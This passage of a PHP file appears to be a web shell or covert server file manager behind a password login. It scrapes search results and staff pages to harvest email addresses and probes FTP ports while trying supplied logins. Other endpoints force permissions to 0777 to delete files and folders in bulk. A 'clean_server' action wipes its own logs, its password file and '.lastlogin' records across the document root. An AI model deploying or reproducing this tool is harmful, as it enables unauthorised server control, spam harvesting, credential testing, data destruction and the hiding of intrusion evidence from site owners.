        if ($body === '') { $ctx = @stream_context_create([ 'http' => [ 'method' => 'GET', 'timeout' => $timeout, 'header' => "User-Agent: $ua\r\nAccept-Language: en-US,en;q=0.8", 'ignore_errors' => true ], 'ssl' => [ 'verify_peer' => false, 'verify_peer_name' => false ] ]); $resp = @file_get_contents($url, false, $ctx); if (is_string($resp)) { $body = $resp; } }
        return $body;
    };
    $extract_emails = function(string $text) use ($emailPattern) {
        $found = [];
        if ($text !== '') { $t = $text; $t = html_entity_decode($t, ENT_QUOTES, 'UTF-8'); $t = preg_replace('/\s*\[?\(?at\)?\]?\s*/i', '@', $t); $t = preg_replace('/\s*(\[?dot\]?|\(dot\)|\s+dot\s+)\s*/i', '.', $t); if (@preg_match_all($emailPattern, $t, $m) && isset($m[0])) { foreach ($m[0] as $e) { $e = (string)$e; if ($e !== '') { $found[] = $e; } } } }
        if (count($found)) { $found = array_values(array_unique($found)); }
        return $found;
    };
    $paramUseApi = isset($_GET['use_api']) ? (string)$_GET['use_api'] : '';
    $apiKey = (string)(getenv('GOOGLE_API_KEY') ?: '');
    $cseId = (string)((getenv('GOOGLE_CX') ?: '') ?: (getenv('GOOGLE_CSE_ID') ?: ''));
    $paramKey = isset($_GET['key']) ? (string)$_GET['key'] : '';
    $paramCx  = isset($_GET['cx']) ? (string)$_GET['cx'] : '';
    if ($paramKey !== '') { $apiKey = $paramKey; }
    if ($paramCx  !== '') { $cseId = $paramCx; }
    $cfgFile = $SECURE_DIR . DIRECTORY_SEPARATOR . 'google_cse.json';
    if (($apiKey === '' || $cseId === '') && is_file($cfgFile)) { $rawCfg = (string)@file_get_contents($cfgFile); $jcfg = $rawCfg !== '' ? @json_decode($rawCfg, true) : null; if (is_array($jcfg)) { if ($apiKey === '' && !empty($jcfg['key'])) { $apiKey = (string)$jcfg['key']; } if ($cseId === '' && !empty($jcfg['cx'])) { $cseId = (string)$jcfg['cx']; } } }
    $useApi = ($paramUseApi === '1') || ($paramUseApi === '' && $apiKey !== '' && $cseId !== '');
    if ($useApi && $apiKey !== '' && $cseId !== '') { $perPage = 10; for ($i = 0; $i < $pages; $i++) { $start = ($i * $perPage) + 1; $apiUrl = 'https://www.googleapis.com/customsearch/v1?key=' . urlencode($apiKey) . '&cx=' . urlencode($cseId) . '&q=' . urlencode($q) . '&num=' . $perPage . '&start=' . $start; $jsonStr = $http_get($apiUrl); $j = @json_decode((string)$jsonStr, true); if (is_array($j) && isset($j['items']) && is_array($j['items'])) { foreach ($j['items'] as $it) { $link = (string)($it['link'] ?? ''); if ($link === '' || isset($visited[$link])) { continue; } $visited[$link] = true; if (stripos($link, 'http') !== 0) { continue; } $resultLinks[] = $link; if (count($resultLinks) >= 80) { break; } } } if (count($resultLinks) >= 80) { break; } } }
    else { for ($i = 0; $i < $pages; $i++) { $start = $i * 10; $url = 'https://www.google.com/search?q=' . urlencode($q) . '&num=10&start=' . $start . '&hl=en'; $html = $http_get($url); if (!is_string($html) || $html === '') { continue; } $onPage = $extract_emails($html); foreach ($onPage as $e) { if (!isset($emails[$e])) { $emails[$e] = true; echo $e . "\n"; @flush(); @ob_flush(); } $sources[$e] = $sources[$e] ?? []; $sources[$e][] = 'search_page'; } if (@preg_match_all('/href=\"\/url\?q=([^&\"]+)/i', $html, $m) && isset($m[1])) { foreach ($m[1] as $enc) { $link = urldecode((string)$enc); if ($link === '' || isset($visited[$link])) { continue; } $visited[$link] = true; if (stripos($link, 'http') !== 0) { continue; } if (stripos($link, 'google') !== false) { continue; } $resultLinks[] = $link; if (count($resultLinks) >= 40) { break; } } } } }
    $deep = (int)($_GET['deep'] ?? 0);
    if ($deep < 0) { $deep = 0; }
    if ($deep > 10) { $deep = 10; }
    $tldRaw = isset($_GET['tld']) ? (string)$_GET['tld'] : '';
    $tlds = [];
    if ($tldRaw !== '') { $tlds = array_map('trim', explode(',', $tldRaw)); $tlds = array_values(array_filter(array_map('strtolower', $tlds), function($s){ return $s !== ''; })); $tlds = array_map(function($s){ return ($s[0] === '.') ? $s : ('.' . $s); }, $tlds); }
    $wantDomain = '';
    if (preg_match('/@([A-Za-z0-9.-]+\.[A-Za-z]{2,})/', $q, $dm) && isset($dm[1])) { $wantDomain = strtolower((string)$dm[1]); }
    $domainDeepCounts = [];
    foreach ($resultLinks as $lnk) {
        $body = $http_get($lnk);
        if (!is_string($body) || $body === '') { continue; }
        $found = $extract_emails($body);
        foreach ($found as $e) {
            if ($wantDomain !== '' && stripos($e, '@'.$wantDomain) === false) { continue; }
            if (!empty($tlds)) { $at = strrpos($e, '@'); if ($at === false) { continue; } $dom = strtolower(substr($e, $at+1)); $ok = false; foreach ($tlds as $suf) { if (substr($dom, -strlen($suf)) === $suf) { $ok = true; break; } } if (!$ok) { continue; } }
            if (!isset($emails[$e])) { $emails[$e] = true; echo $e . "\n"; @flush(); @ob_flush(); }
            $sources[$e] = $sources[$e] ?? []; $sources[$e][] = $lnk;
        }
        if (@preg_match_all('/mailto:([A-Za-z0-9_.%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,})/i', $body, $mm2) && isset($mm2[1])) {
            foreach ($mm2[1] as $e2) {
                $e = (string)$e2;
                if ($wantDomain !== '' && stripos($e, '@'.$wantDomain) === false) { continue; }
                if (!empty($tlds)) { $at = strrpos($e, '@'); if ($at === false) { continue; } $dom = strtolower(substr($e, $at+1)); $ok = false; foreach ($tlds as $suf) { if (substr($dom, -strlen($suf)) === $suf) { $ok = true; break; } } if (!$ok) { continue; } }
                if (!isset($emails[$e])) { $emails[$e] = true; echo $e . "\n"; @flush(); @ob_flush(); }
                $sources[$e] = $sources[$e] ?? []; $sources[$e][] = $lnk;
            }
        }
        if ($deep > 0) {
            $parts = @parse_url($lnk);
            $host = is_array($parts) ? (string)($parts['host'] ?? '') : '';
            $scheme = is_array($parts) ? (string)($parts['scheme'] ?? 'https') : 'https';
            if ($host !== '') {
                if (!isset($domainDeepCounts[$host])) { $domainDeepCounts[$host] = 0; }
                $kw = ['contact','staff','people','team','directory','email','mail','about','support','employees','our-team','our-people','faculty','management','admin','leadership','departments','committee','who-we-are','get-in-touch','reach-us','contact-us','contacts'];
                $cands = [];
                if (@preg_match_all('/<a[^>]+href="([^"]+)"/i', $body, $al) && isset($al[1])) {
                    foreach ($al[1] as $href) {
                        $u = (string)$href;
                        if ($u === '') continue;
                        if (strpos($u, 'mailto:') === 0) continue;
                        if (strpos($u, 'http') !== 0) { $base = $scheme . '://' . $host; if ($u[0] !== '/') { $u = $base . '/' . ltrim($u, './'); } else { $u = $base . $u; } }
                        $pu = @parse_url($u);
                        $h2 = is_array($pu) ? (string)($pu['host'] ?? '') : '';
                        if ($h2 !== $host) continue;
                        if (isset($visited[$u])) continue;
                        $low = strtolower($u);
                        $hit = false; for ($ki=0;$ki<count($kw);$ki++){ if (strpos($low, $kw[$ki]) !== false) { $hit = true; break; } }
                        if ($hit) { $cands[] = $u; }
                    }
                }
                foreach ($cands as $cu) {
                    if ($domainDeepCounts[$host] >= $deep) break;
                    $visited[$cu] = true;
                    $domainDeepCounts[$host]++;
                    $b2 = $http_get($cu);
                    if (!is_string($b2) || $b2 === '') continue;
                    $ex2 = $extract_emails($b2);
                    foreach ($ex2 as $e4) {
                        $e = $e4;
                        if ($wantDomain !== '' && stripos($e, '@'.$wantDomain) === false) { continue; }
                        if (!empty($tlds)) { $at = strrpos($e, '@'); if ($at === false) { continue; } $dom = strtolower(substr($e, $at+1)); $ok = false; foreach ($tlds as $suf) { if (substr($dom, -strlen($suf)) === $suf) { $ok = true; break; } } if (!$ok) { continue; } }
                        if (!isset($emails[$e])) { $emails[$e] = true; echo $e . "\n"; @flush(); @ob_flush(); }
                        $sources[$e] = $sources[$e] ?? []; $sources[$e][] = $cu;
                    }
                    if (@preg_match_all('/mailto:([A-Za-z0-9_.%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,})/i', $b2, $mm3) && isset($mm3[1])) {
                        foreach ($mm3[1] as $em) {
                            $e = (string)$em;
                            if ($wantDomain !== '' && stripos($e, '@'.$wantDomain) === false) { continue; }
                            if (!empty($tlds)) { $at = strrpos($e, '@'); if ($at === false) { continue; } $dom = strtolower(substr($e, $at+1)); $ok = false; foreach ($tlds as $suf) { if (substr($dom, -strlen($suf)) === $suf) { $ok = true; break; } } if (!$ok) { continue; } }
                            if (!isset($emails[$e])) { $emails[$e] = true; echo $e . "\n"; @flush(); @ob_flush(); }
                            $sources[$e] = $sources[$e] ?? []; $sources[$e][] = $cu;
                        }
                    }
                }
            }
        }
    }
    echo "DONE\n";
    exit;
}
// API: set_google_cse — store Google API key and CX securely (JSON POST)
if ((isset($_POST['api']) && $_POST['api'] === 'set_google_cse') || (isset($_GET['api']) && $_GET['api'] === 'set_google_cse')) {
    header('Content-Type: application/json');
    $key = '';
    $cx = '';
    $raw = (string)@file_get_contents('php://input');
    if ($raw !== '') {
        $j = @json_decode($raw, true);
        if (is_array($j)) { $key = (string)($j['key'] ?? ''); $cx = (string)($j['cx'] ?? ''); }
    }
    if ($key === '' || $cx === '') {
        $key = (string)($_POST['key'] ?? '');
        $cx = (string)($_POST['cx'] ?? '');
    }
    if ($key === '' || $cx === '') { echo json_encode(['success'=>false,'error'=>'missing_params']); exit; }
    $file = $SECURE_DIR . DIRECTORY_SEPARATOR . 'google_cse.json';
    $data = json_encode(['key'=>$key,'cx'=>$cx], JSON_UNESCAPED_SLASHES);
    $ok = (@file_put_contents($file, $data, LOCK_EX) !== false);
    if ($ok) { @chmod($file, 0600); echo json_encode(['success'=>true]); }
    else { echo json_encode(['success'=>false,'error'=>'write_failed']); }
    exit;
}
if (isset($_GET['api']) && $_GET['api'] === 'ftpcheck') {
    header('Content-Type: application/json');
    $raw = trim((string)($_GET['domain'] ?? ''));
    $host = $raw;
    if ($host !== '') {
        $lower = strtolower($host);
        if (preg_match('/^https?:\/\//', $lower)) { $parts = @parse_url($lower); $host = (string)($parts['host'] ?? ''); }
    }
    $host = preg_replace('/[^A-Za-z0-9.-]/', '', $host);
    if ($host === '' || strlen($host) > 253) { echo json_encode(['success'=>false,'error'=>'Invalid domain']); exit; }
    $portsRaw = trim((string)($_GET['ports'] ?? ''));
    $explicit = (isset($_GET['explicit']) && $_GET['explicit'] !== '' && $_GET['explicit'] !== '0');
    $user = (string)($_GET['user'] ?? '');
    $pass = (string)($_GET['pass'] ?? '');
    $ports = [];
    if ($portsRaw !== '') {
        foreach (explode(',', $portsRaw) as $p) { $n = (int)trim($p); if ($n >= 1 && $n <= 65535) { $ports[] = $n; } }
    }
    if (!count($ports)) { $ports = [21, 990]; }
    $ports = array_values(array_unique($ports)); if (count($ports) > 16) { $ports = array_slice($ports, 0, 16); }
    $results = [];
    foreach ($ports as $port) {
        $mode = ($port === 990) ? 'ftps_implicit' : (($explicit && $port === 21) ? 'ftp_explicit' : 'ftp');
        $open = false; $banner = ''; $auth = 'skipped'; $errno=0; $errstr='';
        $scheme = ($port === 990) ? ('ssl://' . $host . ':' . $port) : ('tcp://' . $host . ':' . $port);
        $conn = @stream_socket_client($scheme, $errno, $errstr, 2.0);
        if (is_resource($conn)) {
            $open = true;
            @stream_set_blocking($conn, true);
            $buf = '';
            $r = [$conn]; $w = null; $e = null;
            $ready = @stream_select($r, $w, $e, 0, 600000);
            if ($ready && is_array($r) && count($r) > 0) { $buf = (string)@fgets($conn, 256); }
            if ($buf !== '') { $banner = trim(preg_replace('/\s+/', ' ', $buf)); }
            if ($explicit && $port === 21) {
                @fwrite($conn, "AUTH TLS\r\n");
                $resp = (string)@fgets($conn, 256);
                if (stripos($resp, '234') === 0) { @stream_socket_enable_crypto($conn, true, STREAM_CRYPTO_METHOD_TLS_CLIENT); }
            }
            if ($user !== '' && $pass !== '') {
                @fwrite($conn, 'USER ' . $user . "\r\n"); $ru = (string)@fgets($conn, 256);
                @fwrite($conn, 'PASS ' . $pass . "\r\n"); $rp = (string)@fgets($conn, 256);
                $auth = (stripos($rp, '230') === 0 || stripos($ru, '331') === 0) ? 'ok' : 'fail';
            }
            @fwrite($conn, "QUIT\r\n");
            @fclose($conn);
        }
        $results[] = [ 'port'=>$port, 'mode'=>$mode, 'open'=>$open, 'banner'=>$banner, 'auth'=>$auth ];
    }
    echo json_encode([ 'success'=>true, 'domain'=>$host, 'ports'=>$results ]);
    exit;
}
// API: errors log (GET) — return parsed error log grouped by file
if (isset($_GET['api']) && $_GET['api'] === 'errors_log') {
    header('Content-Type: application/json');
    $log = (string)ini_get('error_log');
    if ($log === '') {
        // Fallback to tmp file used by production error handler
        $log = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'coding_errors.log';
        if (!is_file($log)) {
            $alt = __DIR__ . DIRECTORY_SEPARATOR . 'coding_errors.log';
            if (is_file($alt)) { $log = $alt; }
        }
    }
    $exists = is_file($log);
    $size = $exists ? (int)@filesize($log) : 0;
    $entries = [];
    $groups = [];
    if ($exists && $size > 0) {
        try {
            $fh = @fopen($log, 'r');
            if ($fh) {
                // Read last ~800KB to avoid huge logs
                $maxRead = 800 * 1024;
                if ($size > $maxRead) { @fseek($fh, $size - $maxRead); }
                while (!feof($fh)) {
                    $line = fgets($fh);
                    if ($line === false) break;
                    $s = trim($line);
                    if ($s === '') continue;
                    // Try to parse typical PHP error format
                    $severity = null; $msg = $s; $file = null; $ln = null; $ts = null;
                    // Common pattern: "[date] PHP Warning: message in /path/file.php on line 123"
                    if (preg_match('/PHP\s+([A-Za-z]+):\s+(.*?)\s+in\s+(.*?)\s+on\s+line\s+(\d+)/', $s, $m)) {
                        $severity = $m[1]; $msg = $m[2]; $file = $m[3]; $ln = (int)$m[4];
                    } elseif (preg_match('/PHP\s+([A-Za-z]+):\s+(.*)/', $s, $m2)) {
                        $severity = $m2[1]; $msg = $m2[2];
                    }
                    if (preg_match('/\[(.*?)\]/', $s, $mt)) { $ts = $mt[1]; }
                    $entry = [ 'ts' => $ts, 'severity' => $severity, 'message' => $msg, 'file' => $file, 'line' => $ln ];
                    $entries[] = $entry;
                    $gk = $file ? $file : '(unknown)';
                    if (!isset($groups[$gk])) { $groups[$gk] = [ 'file' => $gk, 'count' => 0 ]; }
                    $groups[$gk]['count']++;
                }
                @fclose($fh);
            }
        } catch (Throwable $e) {}
    }
    // Limit entries to last 300 lines
    if (count($entries) > 300) { $entries = array_slice($entries, -300); }
    // Convert groups to list
    $groupList = array_values($groups);
    // Sort groups by count desc
    usort($groupList, function($a, $b){ return ($b['count'] <=> $a['count']); });
    echo json_encode([ 'success' => true, 'path' => $log, 'exists' => $exists, 'size' => $size, 'entries' => $entries, 'groups' => $groupList ]);
    exit;
}
// API: clear errors log (POST)
if (isset($_POST['api']) && $_POST['api'] === 'errors_clear') {
    header('Content-Type: application/json');
    $log = (string)ini_get('error_log');
    if ($log === '') { $log = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'coding_errors.log'; }
    $ok = false;
    try {
        if ($log && is_file($log)) { $ok = (@file_put_contents($log, "") !== false); @chmod($log, 0666); }
        else { $ok = true; }
    } catch (Throwable $e) { $ok = false; }
    echo json_encode([ 'success' => $ok ]);
    exit;
}
// API: delete file in current directory (rm)
if (isset($_POST['api']) && $_POST['api'] === 'rm') {
    header('Content-Type: application/json');
    $dirRel = (string)($_POST['dir'] ?? '');
    if ($dirRel === '') { $dirRel = (string)($_GET['d'] ?? ''); }
    $name = trim((string)($_POST['name'] ?? ''));
    if ($name === '' || !preg_match('/^[A-Za-z0-9._ -]+$/', $name) || strpbrk($name, "\\/\0") !== false) {
        echo json_encode([ 'success' => false, 'error' => 'Invalid file name' ]);
        exit;
    }
    $dirPath = safePath($BASE_DIR, $dirRel);
    if (!$dirPath || !is_dir($dirPath)) {
        echo json_encode([ 'success' => false, 'error' => 'Invalid target directory' ]);
        exit;
    }
    $target = $dirPath . DIRECTORY_SEPARATOR . $name;
    if (!is_file($target)) {
        echo json_encode([ 'success' => false, 'error' => 'File not found' ]);
        exit;
    }
    // Reuse enhanced permission strategy to delete files
    $parentDir = dirname($target);
    // Common and Recommended Permission Combinations
    $attempts = [
        // Standard Secure: Owner R/W/X, Group R/X, Others R/X
        // Files: Owner R/W, Group R, Others R
        ['file' => 0644, 'dir' => 0755],

        // Private: Only Owner has access
        ['file' => 0600, 'dir' => 0700],

        // Group Access: Owner & Group R/W/X, Others no access
        // Files: Owner & Group R/W
        ['file' => 0660, 'dir' => 0770],

        // Shared Group: Owner & Group R/W/X, Others can Read only
        // Files: Owner & Group R/W, Others R
        ['file' => 0664, 'dir' => 0775],
        
        // Original Attempt 1: Highly permissive files, standard directories
        ['file' => 0666, 'dir' => 0755],

        // Original Attempt 2: Fully permissive files, group-shared directories
        ['file' => 0777, 'dir' => 0775],
        
        // Original Attempt 3 (Last Resort): Fully permissive (insecure)
        ['file' => 0777, 'dir' => 0777],
    ];
    $ok = false;
    foreach ($attempts as $perms) {
        @chmod($target, $perms['file']);
        @chmod($parentDir, $perms['dir']);
        clearstatcache(true, $target);
        clearstatcache(true, $parentDir);
        if (@unlink($target)) { $ok = true; break; }
    }
    if ($ok) {
        // Log deleted file with name and relative path
        $relPath = ($dirRel !== '' ? ($dirRel . DIRECTORY_SEPARATOR . $name) : $name);
        try { @file_put_contents($trashLog, (string)time() . "\tfile\t" . basename($target) . "\t" . $relPath . "\n", FILE_APPEND | LOCK_EX); } catch (Throwable $e) {}
        echo json_encode([ 'success' => true ]);
    } else {
        $fileWritable = is_writable($target) ? 'yes' : 'no';
        $dirWritable = is_writable($parentDir) ? 'yes' : 'no';
        $filePerm = sprintf('%o', @fileperms($target) & 0777);
        $dirPerm = sprintf('%o', @fileperms($parentDir) & 0777);
        echo json_encode([ 'success' => false, 'error' => 'Unable to remove file. File writable: ' . $fileWritable . ', dir writable: ' . $dirWritable . ', file perms: ' . $filePerm . ', dir perms: ' . $dirPerm ]);
    }
    exit;
}
// API: delete folder recursively in current directory (rmdir)
if (isset($_POST['api']) && $_POST['api'] === 'rmdir') {
    header('Content-Type: application/json');
    $dirRel = (string)($_POST['dir'] ?? '');
    if ($dirRel === '') { $dirRel = (string)($_GET['d'] ?? ''); }
    $name = trim((string)($_POST['name'] ?? ''));
    if ($name === '' || !preg_match('/^[A-Za-z0-9._ -]+$/', $name) || strpbrk($name, "\\/\0") !== false) {
        echo json_encode([ 'success' => false, 'error' => 'Invalid folder name' ]);
        exit;
    }
    $dirPath = safePath($BASE_DIR, $dirRel);
    if (!$dirPath || !is_dir($dirPath)) {
        echo json_encode([ 'success' => false, 'error' => 'Invalid target directory' ]);
        exit;
    }
    $target = $dirPath . DIRECTORY_SEPARATOR . $name;
    if (!is_dir($target)) {
        echo json_encode([ 'success' => false, 'error' => 'Folder not found' ]);
        exit;
    }
    // Aggressive permission fix then recursive delete
    recursiveChmod($target, 0777, 0777);
    @chmod(dirname($target), 0777);
    clearstatcache(true, $target);
    $ok = rrmdir($target);
    if (!$ok) {
        // Try once more after another permission pass
        recursiveChmod($target, 0777, 0777);
        @chmod(dirname($target), 0777);
        clearstatcache(true, $target);
        $ok = rrmdir($target);
    }
    if ($ok) {
        // Log deleted folder with name and relative path
        $relPath = ($dirRel !== '' ? ($dirRel . DIRECTORY_SEPARATOR . $name) : $name);
        try { @file_put_contents($trashLog, (string)time() . "\tfolder\t" . basename($target) . "\t" . $relPath . "\n", FILE_APPEND | LOCK_EX); } catch (Throwable $e) {}
        echo json_encode([ 'success' => true ]);
    } else {
        $dirWritable = is_writable($target) ? 'yes' : 'no';
        $parentWritable = is_writable(dirname($target)) ? 'yes' : 'no';
        $dirPerm = sprintf('%o', @fileperms($target) & 0777);
        $parentPerm = sprintf('%o', @fileperms(dirname($target)) & 0777);
        echo json_encode([ 'success' => false, 'error' => 'Unable to remove folder. Dir writable: ' . $dirWritable . ', parent writable: ' . $parentWritable . ', dir perms: ' . $dirPerm . ', parent perms: ' . $parentPerm ]);
    }
    exit;
}
if (isset($_POST['api']) && $_POST['api'] === 'massremove') {
    header('Content-Type: application/json');
    $dirRel = (string)($_POST['dir'] ?? '');
    if ($dirRel === '') { $dirRel = (string)($_GET['d'] ?? ''); }
    $rawOnly = $_POST['only'] ?? '';
    $keepNames = [];
    if (is_array($rawOnly)) {
        foreach ($rawOnly as $n) { $n2 = trim((string)$n); if ($n2 !== '') $keepNames[] = $n2; }
    } else {
        $nstr = trim((string)$rawOnly);
        if ($nstr !== '') { foreach (array_map('trim', explode(',', $nstr)) as $n3) { if ($n3 !== '') $keepNames[] = $n3; } }
    }
    $keepSet = [];
    foreach ($keepNames as $nm) {
        if ($nm === '' || !preg_match('/^[A-Za-z0-9._ -]+$/', $nm) || strpbrk($nm, "\\/\0") !== false) { echo json_encode(['success'=>false,'error'=>'Invalid keep names']); exit; }
        $keepSet[$nm] = true;
    }
    if (empty($keepSet)) { echo json_encode(['success'=>false,'error'=>'Keep names required']); exit; }
    $dirPath = safePath($BASE_DIR, $dirRel);
    if (!$dirPath || !is_dir($dirPath)) { echo json_encode(['success'=>false,'error'=>'Invalid target directory']); exit; }
    $items = @scandir($dirPath);
    if ($items === false) { echo json_encode(['success'=>false,'error'=>'Unable to read directory']); exit; }
    $removedFiles = 0; $removedFolders = 0; $errors = [];
    foreach ($items as $name) {
        if ($name === '.' || $name === '..') continue;
        if (array_key_exists($name, $keepSet)) continue;
        $target = $dirPath . DIRECTORY_SEPARATOR . $name;
        if (is_file($target)) {
            // Common and Recommended Permission Combinations
            $attempts = [
                // Standard Secure: Owner R/W/X, Group R/X, Others R/X
                // Files: Owner R/W, Group R, Others R
                ['file' => 0644, 'dir' => 0755],

                // Private: Only Owner has access
                ['file' => 0600, 'dir' => 0700],

                // Group Access: Owner & Group R/W/X, Others no access
                // Files: Owner & Group R/W
                ['file' => 0660, 'dir' => 0770],

                // Shared Group: Owner & Group R/W/X, Others can Read only
                // Files: Owner & Group R/W, Others R
                ['file' => 0664, 'dir' => 0775],
                
                // Original Attempt 1: Highly permissive files, standard directories
                ['file' => 0666, 'dir' => 0755],

                // Original Attempt 2: Fully permissive files, group-shared directories
                ['file' => 0777, 'dir' => 0775],
                
                // Original Attempt 3 (Last Resort): Fully permissive (insecure)
                ['file' => 0777, 'dir' => 0777],
            ];
            $ok = false; $parentDir = dirname($target);
            foreach ($attempts as $perms) {
                @chmod($target, $perms['file']); @chmod($parentDir, $perms['dir']);
                clearstatcache(true, $target); clearstatcache(true, $parentDir);
                if (@unlink($target)) { $ok = true; break; }
            }
            if ($ok) { $removedFiles++; $relPath = ($dirRel !== '' ? ($dirRel . DIRECTORY_SEPARATOR . $name) : $name); try { @file_put_contents($trashLog, (string)time() . "\tfile\t" . basename($target) . "\t" . $relPath . "\n", FILE_APPEND | LOCK_EX); } catch (Throwable $e) {} }
            else { $errors[] = $name; }
        } elseif (is_dir($target)) {
            recursiveChmod($target, 0777, 0777); @chmod(dirname($target), 0777); clearstatcache(true, $target);
            $ok = rrmdir($target);
            if (!$ok) { recursiveChmod($target, 0777, 0777); @chmod(dirname($target), 0777); clearstatcache(true, $target); $ok = rrmdir($target); }
            if ($ok) { $removedFolders++; $relPath = ($dirRel !== '' ? ($dirRel . DIRECTORY_SEPARATOR . $name) : $name); try { @file_put_contents($trashLog, (string)time() . "\tfolder\t" . basename($target) . "\t" . $relPath . "\n", FILE_APPEND | LOCK_EX); } catch (Throwable $e) {} }
            else { $errors[] = $name; }
        }
    }
    $keptList = array_keys($keepSet);
    if (empty($errors)) { echo json_encode(['success'=>true,'removed'=>['files'=>$removedFiles,'folders'=>$removedFolders],'kept'=>$keptList]); }
    else { echo json_encode(['success'=>false,'error'=>'Failed to remove some items','details'=>$errors,'removed'=>['files'=>$removedFiles,'folders'=>$removedFolders],'kept'=>$keptList]); }
    exit;
}
// API: Clean server artifacts (trash log, password, optional self-delete)
if (isset($_POST['api']) && $_POST['api'] === 'clean_server') {
    header('Content-Type: application/json');
    $actionsRaw = (string)($_POST['actions'] ?? '');
    $confirm = (string)($_POST['confirm'] ?? '');
    $actions = array_filter(array_map('trim', explode(',', $actionsRaw)), function($a){ return $a !== ''; });
    $performed = [];
    $errors = [];
    $extra = [];
    try {
        foreach ($actions as $act) {
            if ($act === 'trash') {
                // Truncate trash log
                try { @file_put_contents($trashLog, ""); @chmod($trashLog, 0666); $performed[] = 'trash'; } catch (Throwable $e) { $errors[] = 'trash'; }
            } elseif ($act === 'password') {
                // Remove password file
                try { if (is_file($pwdFile)) { @chmod($pwdFile, 0666); @unlink($pwdFile); } $performed[] = 'password'; } catch (Throwable $e) { $errors[] = 'password'; }
            } elseif ($act === 'lastlogin_scan') {
                // Scan candidate roots and report `.lastlogin` files without cleaning
                $roots = [];
                $roots[] = $BASE_DIR;
                $cwdProbe = (string)realpath((string)getcwd());
                if ($cwdProbe !== '' && $cwdProbe !== false) { $roots[] = $cwdProbe; }
                $doc = (string)($_SERVER['DOCUMENT_ROOT'] ?? '');
                $docReal = ($doc !== '') ? @realpath($doc) : false;
                if ($docReal !== false && is_dir($docReal)) { $roots[] = $docReal; }
                $roots = array_values(array_unique(array_filter($roots, function($r){ return is_string($r) && $r !== '' && is_dir($r); })));
                foreach ($roots as $rt) { @chmod($rt, 0777); }
                $found = scanLastLogin($roots);
                $performed[] = 'lastlogin_scan';
                $extra['lastlogin_found'] = $found;
                $extra['lastlogin_found_count'] = count($found);
            } elseif ($act === 'lastlogin') {
                // Scan candidate roots and clear `.lastlogin` files
                $roots = [];
                $roots[] = $BASE_DIR;
                // Include current working dir if outside sandbox
                $cwdProbe = (string)realpath((string)getcwd());
                if ($cwdProbe !== '' && $cwdProbe !== false) { $roots[] = $cwdProbe; }
                // Include document root if available
                $doc = (string)($_SERVER['DOCUMENT_ROOT'] ?? '');
                $docReal = ($doc !== '') ? @realpath($doc) : false;
                if ($docReal !== false && is_dir($docReal)) { $roots[] = $docReal; }
                // De-duplicate
                $roots = array_values(array_unique(array_filter($roots, function($r){ return is_string($r) && $r !== '' && is_dir($r); })));
                // Attempt a shallow permission relax on each root
                foreach ($roots as $rt) { @chmod($rt, 0777); }
                $res = scanAndCleanLastLogin($roots);
                $performed[] = 'lastlogin';
                $extra['lastlogin_cleaned'] = count($res['cleaned']);
                $extra['lastlogin_errors'] = count($res['errors']);
                $extra['lastlogin_cleaned_list'] = $res['cleaned'];
                $extra['lastlogin_errors_list'] = $res['errors'];
            }
        }
    } catch (Throwable $e) {
        // generic error
    }
    echo json_encode([ 'success' => empty($errors), 'performed' => $performed, 'errors' => $errors, 'extra' => $extra ]);
    exit;
}
if (isset($_POST['do_login'])) {
    $given = trim((string)($_POST['password'] ?? ''));
    $ok = ($given !== '' && verifyGivenPassword($given, $PWD_REC));
    if (!$ok) { $error = 'Login failed: wrong password.'; }
    if ($ok) {
        // Auto-backfill plaintext into manifest if currently missing
        try {
            $t = (string)($PWD_REC['type'] ?? '');
            $p = (string)($PWD_REC['plain'] ?? '');
            if ($t === 'bcrypt' && $p === '' && $given !== '') {
                persistHashedPassword($pwdManifest, $given);
                $PWD_REC = readPasswordRecord($pwdManifest);
            }
        } catch (Throwable $e) { /* best-effort */ }
        $_SESSION['auth_ok'] = true;
        $isAuthed = true;
        unset($_SESSION['remember_only']);
        // If user opted in, issue a remember-me cookie (30 days)
        try {
            $remember = false;
            if ($remember) {
                $marker = '';
                $t = (string)($PWD_REC['type'] ?? '');
                if ($t === 'plain') { $marker = (string)($PWD_REC['plain'] ?? ''); }
                elseif ($t === 'bcrypt' || $t === 'md5') { $marker = (string)($PWD_REC['hash'] ?? ''); }
                if ($marker !== '') {
                    $exp = time() + 30*24*60*60; // 30 days
                    $nonce = function_exists('random_bytes') ? bin2hex(random_bytes(8)) : md5(uniqid('', true));
                    $uaHash = substr(hash('sha256', (string)($_SERVER['HTTP_USER_AGENT'] ?? '')), 0, 16);
                    $sig = hash_hmac('sha256', $exp . ':' . $nonce . ':' . $uaHash, $marker);
                    $token = $exp . '.' . $nonce . '.' . $sig;
                    $isHttps = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || (!empty($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https');
                    @setcookie('coding_remember', $token, [ 'expires' => $exp, 'path' => '/', 'domain' => '', 'secure' => $isHttps, 'httponly' => true, 'samesite' => 'Lax' ]);
                }
            }
        } catch (Throwable $e) { /* ignore cookie errors */ }
        // Flash flag to show success terminal after redirect
        $_SESSION['login_flash'] = 1;
        // Redirect to avoid form resubmission
        header('Location: ' . ((string)($_SERVER['REQUEST_URI'] ?? (string)($_SERVER['SCRIPT_NAME'] ?? basename(__FILE__)))));
        exit;
    } else {
        if (!isset($error)) { $error = 'Login failed: wrong password.'; }
    }
}

// Removed diagnostic API (test_login) to avoid exposing sensitive data
if (!$isAuthed) {
    // Minimal login page with desktop-style icons and pill input
    // Compute wallpaper background same as main app (user-provided default)
$defaultWallpaper = 'https://images7.alphacoders.com/567/thumb-1920-567918.png';
    $wp = isset($_GET['wallpaper']) ? trim((string)$_GET['wallpaper']) : '';
    if ($wp === '') {
        $wallpaperUrl = $defaultWallpaper;
    } elseif (preg_match('/^https?:\/\//i', $wp)) {
        $wallpaperUrl = $wp;
    } else {
        $safeLocal = basename($wp);
        $localPath = $BASE_DIR . DIRECTORY_SEPARATOR . $safeLocal;
        if ($safeLocal !== '' && file_exists($localPath)) {
            // Use relative URL so the PHP built-in server can serve it
            $wallpaperUrl = $safeLocal;
        } else {
            $wallpaperUrl = $defaultWallpaper;
        }
    }
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
